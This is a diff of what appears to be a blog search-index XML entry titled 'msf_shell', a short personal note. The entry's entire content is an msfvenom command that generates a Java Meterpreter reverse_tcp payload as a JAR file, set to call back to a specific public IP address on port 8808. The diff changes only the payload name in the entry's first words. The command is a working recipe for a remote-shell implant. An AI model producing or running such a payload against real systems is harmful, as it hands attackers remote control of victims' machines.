@@ -3,7 +3,7 @@
   <entry>
     <title><![CDATA[msf_shell]]></title>
     <url>%2F2018%2F01%2F18%2Fmsf-shell%2F</url>
-    <content type="text"><![CDATA[windows/meterpreter/reverse_tcp msfvenom -p java/meterpreter/reverse_tcp LHOST=203.101.160.157 LPORT=8808 -f jar -o msfserver.jar]]></content>
+    <content type="text"><![CDATA[java/meterpreter/reverse_tcp msfvenom -p java/meterpreter/reverse_tcp LHOST=203.101.160.157 LPORT=8808 -f jar -o msfserver.jar]]></content>
       <categories>
         <category>笔记</category>
       </categories>
